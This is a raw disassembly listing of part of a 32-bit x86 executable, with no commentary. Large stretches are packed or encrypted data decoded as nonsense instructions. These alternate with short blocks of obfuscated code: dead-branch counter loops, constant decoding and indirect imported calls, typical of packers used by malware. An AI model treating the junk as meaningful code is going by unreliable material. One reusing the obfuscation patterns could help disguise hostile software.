  4058cb:	and    al,0x38
  4058cd:	imul   DWORD PTR [ebx-0x69]
  4058d0:	xchg   esi,eax
  4058d1:	cli    
  4058d2:	into   
  4058d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4058d4:	outs   dx,BYTE PTR ds:[esi]
  4058d5:	test   eax,0x95020fa1
  4058da:	mov    ecx,0x8650d08d
  4058df:	pop    ebx
  4058e0:	cli    
  4058e1:	iret   
  4058e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058e3:	push   esi
  4058e4:	adc    edi,DWORD PTR [edx+0x72bff624]
  4058ea:	clc    
  4058eb:	sbb    al,0x26
  4058ed:	fldcw  WORD PTR [esi+edx*2-0x16]
  4058f1:	pop    edi
  4058f2:	mov    ds:0x3b491559,al
  4058f7:	jnp    0x4058c5
  4058f9:	mov    edi,DWORD PTR [esi+0x68]
  4058fc:	sub    eax,0x7096bcd5
  405901:	outs   dx,DWORD PTR ds:[esi]
  405902:	add    edx,DWORD PTR [edi-0xe]
  405905:	push   eax
  405906:	push   es
  405907:	clc    
  405908:	mov    ebp,0xefc4fdef
  40590d:	(bad)  
  40590f:	xor    al,0x98
  405911:	or     BYTE PTR [edx],al
  405913:	test   BYTE PTR [ebp+ebp*4-0x7b],0xb
  405918:	test   bh,bh
  40591a:	mov    dl,0xcb
  40591c:	push   ebx
  40591d:	aad    0xe8
  40591f:	stos   BYTE PTR es:[edi],al
  405920:	fmul   st(6),st
  405922:	adc    eax,0xd2e89181
  405927:	popa   
  405928:	or     esi,DWORD PTR [ebx-0x33261d94]
  40592e:	jecxz  0x40599a
  405930:	mov    bh,0x72
  405932:	xchg   ecx,eax
  405933:	fisub  DWORD PTR [edx-0x32946d5d]
  405939:	xchg   edx,eax
  40593a:	fwait
  40593b:	mov    ah,0xcd
  40593d:	sti    
  40593e:	or     al,0xc3
  405940:	fst    DWORD PTR [edi+ebp*8]
  405943:	stos   DWORD PTR es:[edi],eax
  405944:	mov    eax,ds:0xc585839d
  405949:	sub    DWORD PTR [eax+edi*4+0x28b50fa3],ebp
  405950:	mov    ss,WORD PTR [esi+0x72]
  405953:	aam    0x79
  405955:	mov    esi,0xc1d6b7cd
  40595a:	out    dx,eax
  40595b:	sub    eax,0x602649c0
  405960:	fsubr  st,st(0)
  405962:	bnd jnp 0x4059d6
  405965:	inc    edi
  405966:	mov    eax,0x1648fc45
  40596b:	mov    ebp,0xe9e2ad16
  405970:	and    eax,0x7f33c443
  405975:	inc    eax
  405976:	mov    dh,0x53
  405978:	sub    DWORD PTR [ecx-0x73],ecx
  40597b:	das    
  40597c:	mov    cl,0x7
  40597e:	xor    eax,0xd3903f21
  405983:	rol    ebp,cl
  405985:	stos   DWORD PTR es:[edi],eax
  405986:	dec    ecx
  405987:	(bad)  
  405988:	mov    bh,0x95
  40598a:	push   ecx
  40598b:	xchg   DWORD PTR [esi+0x54],ecx
  40598e:	adc    eax,ebp
  405990:	cli    
  405991:	sub    eax,0x2c8cdf39
  405996:	iret   
  405997:	leave  
  405998:	imul   ecx,esi,0xffffff82
  40599b:	xor    esi,0x28c2da51
  4059a1:	retf   
  4059a2:	pop    esp
  4059a3:	hlt    
  4059a4:	daa    
  4059a5:	push   ss
  4059a6:	adc    al,0xe
  4059a8:	mov    WORD PTR [edi],cs
  4059aa:	fisub  DWORD PTR [esi]
  4059ac:	imul   esp,DWORD PTR [eax+ebp*8-0x4e],0x63
  4059b1:	mov    esp,0x28c1d563
  4059b6:	push   edx
  4059b7:	popf   
  4059b8:	shr    BYTE PTR [esi+ebp*4],0x8e
  4059bc:	sti    
  4059bd:	ror    DWORD PTR [ebx+0x40d64c0d],cl
  4059c3:	add    BYTE PTR [ecx],al
  4059c5:	or     BYTE PTR [edi+0x5e],bl
  4059c8:	pop    ebx
  4059c9:	leave  
  4059ca:	ret    
  4059cb:	push   ebp
  4059cc:	mov    ebp,esp
  4059ce:	sub    esp,0x44
  4059d1:	push   edi
  4059d2:	sub    eax,DWORD PTR ds:0x4235c7
  4059d8:	mov    eax,DWORD PTR [ebp+0xc]
  4059db:	or     DWORD PTR ds:0x417e4d,edx
  4059e1:	mov    DWORD PTR [ebp-0x10],eax
  4059e4:	mov    DWORD PTR ds:0x417e55,0x17
  4059ee:	cmp    DWORD PTR ds:0x417e55,0x0
  4059f5:	je     0x405a59
  4059fb:	cmp    DWORD PTR ds:0x417e55,0x6
  405a02:	jne    0x405a2b
  405a08:	push   DWORD PTR [ebp-0x24]
  405a0b:	push   DWORD PTR [ebp-0x28]
  405a0e:	push   0x417e45
  405a13:	push   0x80ed
  405a18:	push   0x67be
  405a1d:	push   0x6b4c
  405a22:	push   DWORD PTR [ebp-0x20]
  405a25:	call   DWORD PTR ds:0x40d1cc
  405a2b:	cmp    DWORD PTR ds:0x417e55,0x7
  405a32:	jne    0x405a47
  405a38:	xor    ecx,ecx
  405a3a:	or     ecx,DWORD PTR ds:0x417e55
  405a40:	dec    ecx
  405a41:	mov    DWORD PTR ds:0x417e55,ecx
  405a47:	mov    ecx,DWORD PTR ds:0x417e55
  405a4d:	dec    ecx
  405a4e:	mov    DWORD PTR ds:0x417e55,ecx
  405a54:	jmp    0x4059ee
  405a59:	mov    eax,DWORD PTR [ebp+0x8]
  405a5c:	or     DWORD PTR ds:0x417e41,0x3fc5
  405a66:	mov    DWORD PTR [ebp+0x8],0xf89c8538
  405a6d:	xor    ecx,ecx
  405a6f:	add    ecx,DWORD PTR ds:0x4235c3
  405a75:	and    DWORD PTR ds:0x41abd6,ecx
  405a7b:	mov    DWORD PTR [ebp-0x20],0xf89c853b
  405a82:	mov    edx,DWORD PTR [ebp+0x8]
  405a85:	mov    DWORD PTR [ebp-0x40],eax
  405a88:	mov    eax,0x7510859
  405a8d:	xor    edx,eax
  405a8f:	adc    ecx,ecx
  405a91:	mov    ecx,0x32729f
  405a96:	movzx  edi,WORD PTR ds:0x41510d
  405a9d:	sbb    DWORD PTR ds:0x4235cf,edi
  405aa3:	add    edx,ecx
  405aa5:	add    DWORD PTR ds:0x412354,0x1575
  405aaf:	mov    DWORD PTR [ebp-0x8],edx
  405ab2:	jmp    0x405c04
  405ab7:	(bad)  [edi+ebp*4-0x19]
  405abb:	mov    eax,ds:0x80785be5
  405ac0:	cmp    DWORD PTR ds:[edi],edx
  405ac3:	xchg   ecx,eax
  405ac4:	fwait
  405ac5:	in     al,0x57
  405ac7:	xchg   BYTE PTR [ebx],cl
  405ac9:	jle    0x405b49
  405acb:	and    edi,DWORD PTR [edi+0x7e]
  405ace:	jle    0x405ad3
  405ad0:	jmp    0x128db247
  405ad5:	in     al,0x2b
  405ad7:	icebp  
  405ad8:	pop    ds
  405ad9:	jl     0x405aac
  405adb:	jo     0x405b5a
  405add:	add    esi,esi
  405adf:	imul   edi,DWORD PTR [edi+edi*1-0xa],0x13b12410
  405ae7:	rcl    DWORD PTR [ebx],1
  405ae9:	in     eax,0xca
  405aeb:	cmp    bl,dh
  405aed:	and    eax,DWORD PTR [eax+eax*1+0x1b]
  405af1:	xchg   DWORD PTR [ebx-0x20],ebp
  405af4:	stos   BYTE PTR es:[edi],al
  405af5:	outs   dx,DWORD PTR ds:[esi]
  405af6:	aad    0x52
  405af8:	shl    BYTE PTR [esi+0x50bdabb5],0x3e
  405aff:	xchg   DWORD PTR [ecx],eax
  405b01:	pop    es
  405b02:	jae    0x405ac0
  405b04:	mov    ebp,0x99b48b68
  405b09:	xchg   ebp,eax
  405b0a:	jg     0x405b34
  405b0c:	push   es
  405b0d:	push   esp
  405b0e:	push   ds
  405b0f:	push   esp
  405b10:	jb     0x405b33
  405b12:	pop    ecx
  405b13:	xchg   DWORD PTR [ebx],edi
  405b15:	js     0x405b4e
  405b17:	push   ds
  405b18:	jmp    0x25bf:0x9acbdc01
  405b1f:	adc    dl,BYTE PTR ds:0x6359fe56
  405b25:	mov    ds:0xb28f5ad3,al
  405b2a:	sub    edi,ebp
  405b2c:	fs jle 0x405ba8
  405b2f:	inc    edi
  405b30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b31:	mov    BYTE PTR [eax-0x11],ah
  405b34:	imul   ebx
  405b36:	out    0x2b,eax
  405b38:	mov    DWORD PTR [ecx+eax*2-0x16361e6a],edx
  405b3f:	enter  0x347e,0xeb
  405b43:	push   ss
  405b44:	sub    eax,0x83135e9a
  405b49:	outs   dx,DWORD PTR ds:[esi]
  405b4b:	inc    edx
  405b4c:	scas   eax,DWORD PTR es:[edi]
  405b4d:	mov    esi,0xb31dd0cd
  405b52:	pop    esp
  405b53:	cmp    ch,0xdb
  405b56:	cmp    esp,eax
  405b58:	inc    eax
  405b59:	cmp    al,ch
  405b5b:	scas   eax,DWORD PTR es:[edi]
  405b5c:	sub    edi,DWORD PTR [ecx]
  405b5e:	jmp    0xdc6c9286
  405b63:	arpl   WORD PTR [ecx+0x14ef4f3f],bx
  405b69:	jns    0x405b1e
  405b6b:	(bad)  [ecx-0x7dbaccfb]
  405b71:	mov    ebp,0x7e4a9df7
  405b76:	xor    al,0x58
  405b78:	and    eax,0x45f58c6e
  405b7d:	push   0xffffff8d
  405b7f:	xor    esi,DWORD PTR [edx-0x16]
  405b82:	xchg   edx,eax
  405b83:	das    
  405b84:	jge    0x405b3a
  405b86:	xchg   ebx,eax
  405b87:	faddp  st(0),st
  405b89:	inc    esi
  405b8a:	inc    eax
  405b8b:	pop    edi
  405b8c:	js     0x405b16
  405b8e:	pop    ss
  405b8f:	sub    eax,0x7703804b
  405b94:	stc    
  405b95:	into   
  405b96:	loope  0x405bc8
  405b98:	sbb    al,0x67
  405b9a:	int    0xe7
  405b9c:	adc    eax,0x8ce9e070
  405ba1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ba2:	sbb    eax,0x7718b1e6
  405ba7:	mov    bl,0xe9
  405ba9:	dec    esi
  405baa:	pushf  
  405bab:	dec    ecx
  405bac:	loop   0x405b68
  405bae:	leave  
  405baf:	nop
  405bb0:	aad    0x9c
  405bb2:	and    al,0x8b
  405bb4:	mov    esp,0x1d2cbc3f
  405bb9:	pop    edi
  405bba:	loopne 0x405bc4
  405bbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405bbd:	dec    ecx
  405bbe:	sbb    DWORD PTR [eax+0x56],ebp
  405bc1:	mov    ds:0x10e881c3,al
  405bc6:	or     cl,BYTE PTR [ebx]
  405bc8:	xchg   esi,eax
  405bc9:	sub    al,0xf5
  405bcb:	mov    bl,0x60
  405bcd:	mul    BYTE PTR [edx]
  405bcf:	inc    esp
  405bd0:	adc    ebp,DWORD PTR [esi-0x2eba6b85]
  405bd6:	mov    es,WORD PTR [ebx]
  405bd8:	adc    edx,DWORD PTR [edx+0x4e0de162]
  405bde:	dec    esi
  405bdf:	(bad)  
  405be0:	lds    ebp,FWORD PTR [eax+0x2f]
  405be3:	push   0x2c697363
  405be8:	mov    bl,0x90
  405bea:	rcr    BYTE PTR [ebp-0x11a9754d],cl
  405bf0:	adc    DWORD PTR [ebx-0x311cb10],edi
  405bf6:	arpl   WORD PTR [eax-0x1f],ax
  405bf9:	ror    BYTE PTR [esi],1
  405bfb:	pop    ebx
  405bfd:	fxch   st(7)
  405bff:	add    al,0x2a
  405c01:	hlt    
  405c02:	lds    ecx,FWORD PTR [ebp-0x7ef7aa75]
  405c08:	and    eax,0x4235d7
  405c0d:	add    BYTE PTR [eax],al
  405c0f:	add    BYTE PTR [eax],al
  405c11:	jmp    0x405c25
  405c16:	xor    edi,edi
  405c18:	or     edi,DWORD PTR ds:0x4235d7
  405c1e:	inc    edi
  405c1f:	mov    DWORD PTR ds:0x4235d7,edi
  405c25:	cmp    DWORD PTR ds:0x4235d7,0x11
  405c2c:	jae    0x405c53
  405c32:	cmp    DWORD PTR ds:0x4235d7,0x1a
  405c39:	jne    0x405c48
  405c3f:	push   DWORD PTR [ebp-0x1c]
  405c42:	call   DWORD PTR ds:0x40d29c
  405c48:	jmp    0x405c16
  405c4d:	xor    DWORD PTR ds:0x412358,ebx
  405c53:	xor    edx,eax
  405c55:	add    edx,ecx
  405c57:	jmp    0x405da9
  405c5c:	xchg   edi,eax
  405c5d:	(bad)  
  405c5e:	call   0xe86f:0x6bdabbc6
  405c65:	pop    ds
  405c66:	jb     0x405cc2
  405c68:	mov    edx,0x4b398e04
  405c6d:	or     BYTE PTR [esi+0x7e],bh
  405c70:	and    edi,DWORD PTR [edi+0x7e]
  405c73:	jle    0x405c75
  405c75:	mov    ch,0xf4
  405c77:	data16 scas al,BYTE PTR es:[edi]
  405c79:	pop    edx
  405c7a:	inc    BYTE PTR [eax+0x1c]
  405c7d:	add    eax,0x237d6520
  405c82:	mov    ebp,0x5a0e7b57
  405c87:	adc    eax,0x189b7a49
  405c8c:	in     al,0xf2
  405c8e:	adc    eax,0x3e333f47
  405c93:	push   esi
  405c94:	out    0xcc,eax
  405c96:	mov    ebp,0x4b7b5ca6
  405c9b:	add    DWORD PTR [eax-0x40414dc1],ebp
  405ca1:	inc    ecx
  405ca2:	mov    eax,0xb63fa9ca
  405ca7:	sbb    al,0xd9
  405ca9:	adc    al,0x8d
  405cab:	pop    ss
  405cac:	lea    ecx,[ebx-0x207a5793]
  405cb2:	pop    eax
  405cb3:	inc    edx
  405cb4:	xchg   ebp,eax
  405cb5:	shr    WORD PTR [edi+edx*1+0x6d71b78a],cl
  405cbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405cbe:	pop    edx
  405cbf:	aaa    
  405cc0:	mov    bl,0xfd
  405cc2:	mov    ecx,edi
  405cc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405cc5:	inc    ebx
  405cc6:	push   es
  405cc7:	inc    ebp
  405cc8:	lea    edx,[edx]
  405cca:	adc    BYTE PTR ds:0x7ebf30fc,dl
  405cd0:	cmc    
  405cd1:	sub    al,0xe5
  405cd3:	stos   DWORD PTR es:[edi],eax
  405cd4:	imul   eax,DWORD PTR ds:0x8bbcb48,0xe0cb04f4
  405cde:	ret    0x1ab3
  405ce1:	cs int3 
  405ce3:	(bad)  
  405ce4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ce5:	dec    edx
  405ce6:	out    dx,al
  405ce7:	jg     0x405cc6
  405ce9:	lahf   
  405cea:	ret    0xb3a0
  405ced:	dec    esp
  405cee:	sbb    al,0x34
  405cf0:	cli    
  405cf1:	mov    eax,DWORD PTR [ebp+0x2b]
  405cf4:	iret   
  405cf5:	inc    dh
  405cf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405cf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405cf9:	adc    eax,0xb53c4357
  405cfe:	push   0xffffffac
  405d00:	sub    BYTE PTR [edx+ebp*1-0x6b],0x64
  405d05:	xchg   edi,eax
  405d06:	dec    edi
  405d07:	outs   dx,BYTE PTR ds:[esi]
  405d08:	mov    bl,0xbe
  405d0a:	pushf  
  405d0b:	imul   ecx,ebp,0xffffffad
  405d0e:	mov    edi,0x657a8840
  405d13:	inc    esp
  405d14:	cli    
  405d15:	ret    
  405d16:	xlat   BYTE PTR ds:[ebx]
  405d17:	sub    eax,0xeabf75c
  405d1c:	mov    al,0xbc
  405d1e:	mov    ch,0xb7
  405d20:	mov    esp,0x5e4c72e1
  405d25:	adc    BYTE PTR ds:0x7cbe25b2,bl
  405d2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d2c:	push   cs
  405d2d:	lods   eax,DWORD PTR ds:[esi]
  405d2e:	retf   
  405d2f:	mov    edi,0x4000a305
  405d34:	sbb    ebp,DWORD PTR [esi-0x7c]
  405d37:	xor    eax,0xcc4a5d34
  405d3c:	dec    esp
  405d3d:	jmp    0xb19008fd
  405d42:	xor    eax,ebp
  405d44:	(bad)  
  405d45:	je     0x405cc8
  405d47:	enter  0x1a7d,0xf6
  405d4b:	inc    ebp
  405d4c:	mov    DWORD PTR ds:0x7d79292f,esi
  405d52:	jno    0x405d5c
  405d54:	dec    edx
  405d55:	mov    ah,0x1e
  405d57:	lods   eax,DWORD PTR ds:[esi]
  405d58:	cmp    dh,BYTE PTR [ecx+esi*2]
  405d5b:	pop    ss
  405d5c:	mov    eax,ds:0xe7bcf0c2
  405d61:	stos   DWORD PTR es:[edi],eax
  405d62:	xlat   BYTE PTR ds:[ebx]
  405d63:	jbe    0x405d73
  405d65:	pushf  
  405d66:	xchg   edi,eax
  405d67:	stos   BYTE PTR es:[edi],al
  405d68:	pop    esp
  405d69:	sub    BYTE PTR ds:0xa013f4e5,ch
  405d6f:	mov    ds:0xdc125290,al
  405d74:	fcom   QWORD PTR [eax+0x68]
  405d77:	xchg   BYTE PTR [ebx+0x35],bh
  405d7a:	xchg   edx,eax
  405d7b:	retf   
  405d7c:	jmp    0x405db3
  405d7e:	cmp    DWORD PTR [edi],0x6e2d48ff
  405d84:	ret    
  405d85:	mov    ah,0x21
  405d87:	fist   WORD PTR [ecx]
  405d89:	jmp    0xa2bb29a8
  405d8e:	outs   dx,BYTE PTR ds:[esi]
  405d8f:	repz sub DWORD PTR [ebp+0x5d],ebp
  405d93:	mov    ds:0xbb0bd262,eax
  405d98:	dec    edx
  405d99:	xor    dl,BYTE PTR [edx]
  405d9b:	and    al,0x88
  405d9d:	dec    edi
  405d9e:	call   0x73acd420
  405da3:	jmp    0x405d96
  405da5:	cmp    BYTE PTR [ecx+0x5589af0c],ah
  405dab:	or     al,0x47
  405dad:	jmp    0x405eff
  405db2:	or     eax,0xb8afae9b
  405db7:	mov    ebx,0x598db90d
  405dbc:	or     al,0x3
  405dbe:	inc    ebp
  405dbf:	xchg   BYTE PTR [edx+0x22],al
  405dc2:	jl     0x405dd2
  405dc4:	jle    0x405e44
  405dc6:	and    edi,DWORD PTR [edi+0x7e]
  405dc9:	jle    0x405d65
  405dcb:	push   ecx
  405dcc:	ret    0x9973
  405dcf:	mov    esp,DWORD PTR [edi]
  405dd1:	xor    al,0x1b
  405dd3:	jae    0x405e32
  405dd5:	xchg   BYTE PTR [edx+0xa1743ce],ah
  405ddb:	sbb    DWORD PTR [esi-0x55feac21],esi
  405de1:	add    BYTE PTR [eax],dl
  405de3:	loope  0x405dc1
  405de5:	mov    ecx,0x3e409170
  405dea:	cmp    eax,0xdff83d40
  405def:	sbb    ebp,DWORD PTR [esi+0x57]
  405df2:	test   BYTE PTR [esi+ecx*1-0x38],0x1f
  405df7:	fbld   TBYTE PTR [edi+0x7]
  405dfa:	enter  0xb6bf,0x37
  405dfe:	inc    ebp
  405dff:	test   BYTE PTR [ecx-0x797c3f0b],ch
  405e05:	call   0xdfb3:0xf3ad1a80
  405e0c:	mov    ds:0x59fe8860,eax
  405e11:	popf   
  405e12:	fiadd  WORD PTR [ebx-0x23b38e95]
  405e18:	lds    ebp,FWORD PTR [esp+edx*1]
  405e1b:	push   0xffffffaf
  405e1d:	imul   esi,DWORD PTR [ebp+0x6793a316],0x867f65d0
  405e27:	sbb    ebx,DWORD PTR [eax+0x116d35bb]
  405e2d:	ins    DWORD PTR es:[edi],dx
  405e2e:	xor    DWORD PTR [edx-0x402a93c7],esp
  405e34:	mov    esi,0x3965008
  405e39:	mov    edi,0xdeb6b6dd
  405e3e:	imul   esi,DWORD PTR [edx-0x3b],0x1b4d544f
  405e45:	(bad)  
  405e46:	cmp    cl,BYTE PTR [eax]
  405e48:	out    dx,al
  405e49:	in     eax,dx
  405e4a:	xchg   DWORD PTR [edx+ecx*4-0x1c3796e2],edi
  405e51:	out    dx,al
  405e52:	repnz push ss
  405e54:	sbb    BYTE PTR [edi+0x29],bh
  405e57:	sub    al,0xab
  405e59:	mov    esp,0xc551bcd5
  405e5e:	rep lods eax,DWORD PTR ds:[esi]
  405e60:	adc    BYTE PTR [esi],bl
  405e62:	xchg   BYTE PTR [edx-0x7b],bh
  405e65:	sbb    BYTE PTR [ebp-0x7b783515],ah
  405e6b:	pop    ebx
  405e6c:	sti    
  405e6d:	sub    ah,al
  405e6f:	aaa    
  405e70:	pop    eax
  405e71:	sbb    edx,DWORD PTR [esi+edi*8-0x4f007b9d]
  405e78:	jge    0x405e57
  405e7a:	popf   
  405e7b:	fwait
  405e7c:	pop    es
  405e7d:	jo     0x405ea2
  405e7f:	leave  
  405e80:	sub    edx,ecx
  405e82:	push   es
  405e83:	push   esi
  405e84:	test   eax,0x3d108064
  405e89:	sub    DWORD PTR [esi+0x3d],ecx
  405e8c:	ins    BYTE PTR es:[edi],dx
  405e8d:	fwait
  405e8e:	xchg   esp,eax
  405e8f:	jge    0x405ef7
  405e91:	sub    bl,BYTE PTR [eax+edx*8+0x18c0034a]
  405e98:	div    DWORD PTR [edi]
  405e9a:	iret   
  405e9b:	fadd   QWORD PTR gs:[esi-0x3e985684]
  405ea2:	arpl   WORD PTR [ebx],bx
  405ea4:	enter  0x65d2,0x5e
  405ea8:	add    al,bl
  405eaa:	jl     0x405eef
  405eac:	sub    eax,0x48ae73ed
  405eb1:	enter  0x8c44,0x49
  405eb5:	add    dl,BYTE PTR [eax-0x67]
  405eb8:	fidivr DWORD PTR [esi+0x2d]
  405ebb:	ss lahf 
  405ebd:	mov    esi,DWORD PTR [eax+ebp*2+0x23]
  405ec1:	adc    BYTE PTR [ebx-0x38],bl
  405ec4:	dec    edx
  405ec5:	bnd jns 0x405f29
  405ec8:	mov    BYTE PTR [edi],ch
  405eca:	cmp    eax,DWORD PTR [eax]
  405ecc:	test   al,0x8a
  405ece:	data16 fidivr DWORD PTR [ebp-0x72]
  405ed2:	add    eax,DWORD PTR [ecx]
  405ed4:	add    DWORD PTR [eax],edi
  405ed6:	mov    dh,BYTE PTR [edi]
  405ed8:	jecxz  0x405e5e
  405eda:	pop    ebp
  405edb:	sub    edi,DWORD PTR [edx]
  405edd:	jmp    0xf3b675ac
  405ee2:	nop
  405ee3:	ins    DWORD PTR es:[edi],dx
  405ee4:	cld    
  405ee5:	imul   eax,DWORD PTR [ecx],0x31632834
  405eeb:	cs mov bl,0x67
  405eee:	daa    
  405eef:	add    al,0x74
  405ef1:	lds    ebx,FWORD PTR [ebx+0x48]
  405ef4:	inc    edx
  405ef5:	or     ch,0xf9
  405ef8:	sbb    eax,0xfa29ef01
  405efd:	and    eax,0xfc45c7f8
  405f02:	fadd   DWORD PTR [ebp-0xcc0764]
  405f08:	xor    edi,DWORD PTR ds:0x415109
  405f0e:	adc    edi,DWORD PTR ds:0x4235bf
  405f14:	mov    DWORD PTR ds:0x415109,edi
  405f1a:	mov    DWORD PTR [ebp-0x28],0xf89c853a
  405f21:	mov    DWORD PTR [ebp-0x2c],0xf89c853d
  405f28:	adc    edi,edi
  405f2a:	mov    DWORD PTR [ebp-0x30],0xf89c853c
  405f31:	or     DWORD PTR ds:0x4235cf,edx
  405f37:	mov    DWORD PTR [ebp-0x34],0xf89c853f
  405f3e:	mov    DWORD PTR ds:0x417e41,0x15
  405f48:	cmp    DWORD PTR ds:0x417e41,0x0
  405f4f:	je     0x405fae
  405f55:	cmp    DWORD PTR ds:0x417e41,0x5
  405f5c:	jne    0x405f7c
  405f62:	push   0x43a6
  405f67:	push   0x41ac41
  405f6c:	push   0x41ac72
  405f71:	push   0x400000
  405f76:	call   DWORD PTR ds:0x40d1d0
  405f7c:	cmp    DWORD PTR ds:0x417e41,0x6
  405f83:	jne    0x405f96
  405f89:	mov    edi,DWORD PTR ds:0x417e41
  405f8f:	dec    edi
  405f90:	mov    DWORD PTR ds:0x417e41,edi
  405f96:	mov    edi,DWORD PTR ds:0x417e41
  405f9c:	dec    edi
  405f9d:	mov    DWORD PTR ds:0x417e41,edi
  405fa3:	jmp    0x405f48
  405fa8:	xor    edi,DWORD PTR ds:0x417e4d
  405fae:	mov    DWORD PTR [ebp-0x38],0xf89c853e
  405fb5:	and    DWORD PTR ds:0x412364,0xe44
  405fbf:	mov    DWORD PTR [ebp-0x3c],0xf89c8531
  405fc6:	or     DWORD PTR ds:0x417e49,0x6f97
  405fd0:	mov    edx,DWORD PTR [ebp+0x8]
  405fd3:	and    DWORD PTR ds:0x417e55,0x0
  405fdd:	jmp    0x405fef
  405fe2:	mov    edi,DWORD PTR ds:0x417e55
  405fe8:	inc    edi
  405fe9:	mov    DWORD PTR ds:0x417e55,edi
  405fef:	cmp    DWORD PTR ds:0x417e55,0x14
  405ff6:	jae    0x40601f
  405ffc:	cmp    DWORD PTR ds:0x417e55,0x1c
  406003:	jne    0x406014
  406009:	push   0x67ac
  40600e:	call   DWORD PTR ds:0x40d2a0
  406014:	jmp    0x405fe2
  406019:	sub    edi,DWORD PTR ds:0x412378
  40601f:	xor    edx,eax
  406021:	mov    edi,DWORD PTR [ebp-0x10]
  406024:	add    edx,ecx
  406026:	cmp    edi,edx
  406028:	mov    DWORD PTR ds:0x412368,0x5602
  406032:	je     0x407428
  406038:	mov    DWORD PTR ds:0x415109,0xf2d
  406042:	jmp    0x406194
  406047:	lock mov ebx,0xdc791c5b
  40604d:	jns    0x40600a
  40604f:	mov    eax,ds:0xd8db13c5
  406054:	mov    ebx,0xf21b46f
  406059:	jle    0x4060d9
  40605b:	and    edi,DWORD PTR [edi+0x7e]
  40605e:	jle    0x406060
  406060:	inc    edi
  406061:	jnp    0x40604b
  406063:	pushf  
  406064:	(bad)  
  406066:	push   ebp
  406067:	mov    al,0x1b
  406069:	sub    ch,0x8f
  40606c:	(bad)  
  40606e:	mov    esi,0xa799b9ba
  406073:	mov    esi,0xa05c49b6
  406078:	sahf   
  406079:	aas    
  40607a:	push   edi
  40607b:	arpl   WORD PTR [ecx],cx
  40607d:	push   ebx
  40607e:	xchg   ebx,eax
  40607f:	sahf   
  406080:	jp     0x406095
  406082:	es cmp al,0xb7
  406085:	jmp    0x51c:0x3898bc0c
  40608c:	cmp    DWORD PTR [ecx+0x73],ebx
  40608f:	(bad)  
  406090:	pop    eax
  406091:	xchg   esi,eax
  406092:	scas   al,BYTE PTR es:[edi]
  406093:	ss aas 
  406095:	push   ds
  406096:	shr    DWORD PTR [edi],1
  406098:	inc    esi
  406099:	mov    BYTE PTR [edi],0x10
  40609c:	jmp    FWORD PTR [esi]
  40609e:	push   ebx
  40609f:	addr16 je 0x406056
  4060a2:	and    DWORD PTR [edx],ecx
  4060a4:	inc    esp
  4060a5:	jge    0x406093
  4060a7:	push   edx
  4060a8:	aam    0x80
  4060aa:	pop    ebp
  4060ab:	js     0x406102
  4060ad:	inc    edi
  4060ae:	fistp  DWORD PTR [ebp-0x27]
  4060b1:	pop    ds
  4060b2:	and    DWORD PTR [edi],0x62d808cb
  4060b8:	(bad)  
  4060b9:	cmp    eax,0x347e8200
  4060be:	pop    esi
  4060bf:	pop    edi
  4060c0:	jne    0x406096
  4060c2:	push   ecx
  4060c3:	shl    BYTE PTR [edx+0xe],0x9e
  4060c7:	loope  0x40606a
  4060c9:	sbb    eax,edi
  4060cb:	icebp  
  4060cc:	int3   
  4060cd:	dec    ebx
  4060ce:	mov    ah,ah
  4060d0:	and    dh,cl
  4060d2:	cdq    
  4060d3:	fnstsw WORD PTR [ecx-0x74afd8dd]
  4060d9:	cmp    cl,BYTE PTR [ebx+0x6e]
  4060dc:	push   esp
  4060dd:	sti    
  4060de:	adc    al,BYTE PTR [eax+0x2a3be388]
  4060e4:	enter  0xba02,0xb0
  4060e8:	mov    ds:0xab09570e,eax
  4060ed:	fldenv [esi]
  4060ef:	ins    BYTE PTR es:[edi],dx
  4060f0:	aad    0x31
  4060f2:	jnp    0x406122
  4060f4:	xchg   edx,eax
  4060f5:	inc    edi
  4060f6:	xchg   edi,esp
  4060f8:	pop    esp
  4060f9:	or     BYTE PTR [edi+0x2a843b58],0x7f
  406100:	inc    esp
  406101:	call   0x63014009
  406106:	adc    DWORD PTR [eax],eax
  406108:	les    ebp,FWORD PTR ds:[eax-0x5e]
  40610c:	out    0x35,eax
  40610e:	push   es
  40610f:	adc    esi,DWORD PTR [ebx-0x6b]
  406112:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406113:	add    DWORD PTR [edi+ebx*8+0x5baa955],ecx
  40611a:	mov    eax,0x89fab6e3
  40611f:	(bad)  
  406120:	test   eax,0xb0b1b5d
  406125:	sub    esp,esi
  406127:	call   0xc730588d
  40612c:	aad    0xda
  40612e:	cmc    
  40612f:	dec    esi
  406130:	sub    bl,bl
  406132:	push   es
  406133:	ror    DWORD PTR [edi+eiz*8-0x78ba6026],1
  40613a:	stos   DWORD PTR es:[edi],eax
  40613b:	repz jle 0x4060e5
  40613e:	fistp  QWORD PTR [ecx]
  406140:	inc    ebp
  406141:	jbe    0x4060cb
  406143:	les    esp,FWORD PTR [esi-0x3e]
  406146:	and    eax,0x35223fc6
  40614b:	les    ebp,FWORD PTR [edx+eiz*1-0x1540f703]
  406152:	imul   ebp,eax,0xffffff83
  406155:	sub    esi,ebp
  406157:	pop    ebp
  406158:	and    DWORD PTR [ecx-0x6e],ebx
  40615b:	loop   0x4061a2
  40615d:	sub    al,0xbe
  40615f:	inc    ecx
  406160:	ret    
  406161:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406162:	mov    dl,0xf8
  406164:	mul    DWORD PTR [esi]
  406166:	inc    ebp
  406167:	and    eax,0xf0fe81b2
  40616c:	mov    eax,ds:0xdd55b943
  406171:	sahf   
  406172:	sbb    edx,eax
  406174:	scas   al,BYTE PTR es:[edi]
  406175:	push   ss
  406176:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406177:	ins    DWORD PTR es:[edi],dx
  406178:	jmp    0x406164
  40617a:	dec    eax
  40617b:	(bad)  
  40617c:	loopne 0x40613d
  40617e:	rol    BYTE PTR [eax+0x27251031],0x36
  406185:	jno    0x40610d
